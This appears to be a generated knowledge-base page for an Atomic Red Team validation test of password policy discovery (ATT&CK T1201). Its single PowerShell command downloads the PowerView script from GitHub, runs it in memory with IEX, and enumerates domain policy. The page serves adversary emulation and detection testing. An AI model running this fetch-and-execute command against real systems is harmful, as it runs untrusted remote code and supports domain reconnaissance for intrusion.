---
atomic_guid: "3177f4da-3d4b-4592-8bdc-aa23d0b2e843"
title: "Get-DomainPolicy with PowerView"
framework: "atomic"
generated: "true"
attack_technique_id: "T1201"
attack_technique_name: "Password Policy Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "3177f4da-3d4b-4592-8bdc-aa23d0b2e843"
  - "Get-DomainPolicy with PowerView"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Get-DomainPolicy with PowerView

Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.

## Metadata

- Atomic GUID: 3177f4da-3d4b-4592-8bdc-aa23d0b2e843
- Technique: T1201: Password Policy Discovery
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1201/T1201.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1201-password_policy_discovery|T1201]]

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.yaml)
